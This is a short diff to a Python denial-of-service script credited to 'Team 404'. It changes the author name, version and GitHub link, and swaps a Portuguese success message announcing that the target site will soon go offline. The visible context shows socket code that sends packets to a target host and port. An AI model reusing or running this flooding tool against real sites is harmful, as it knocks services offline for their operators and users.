@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 # leng python 3.3.2+
-# Codded by Sayonar4-onion
+# Codded by ch4rse404
 # Team 404
 
 
@@ -48,7 +48,7 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("[+] Attack by team 404 fodase o sistema |")
+				print ("[+] Attack by team 404, vai ficar off jaja |")
 			else:
 				s.shutdown(1)
 				print("\033[91msite fora do ar\033[0m")
@@ -99,8 +99,8 @@ def usage():
               .# !@@@@@@@#.        .#@@@@#@##.#.
                   :#@@@#@@.        .#@@@@@@!
                          .##########:\033[0m
-                                           v 1.0
-\033[94mhttps://github.com/sayonar4-onion\033[0m
+                                           v 1.5
+\033[94mhttps://github.com/Ch4rse404 \033[0m
 
 \033[94m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++\033[0m
 
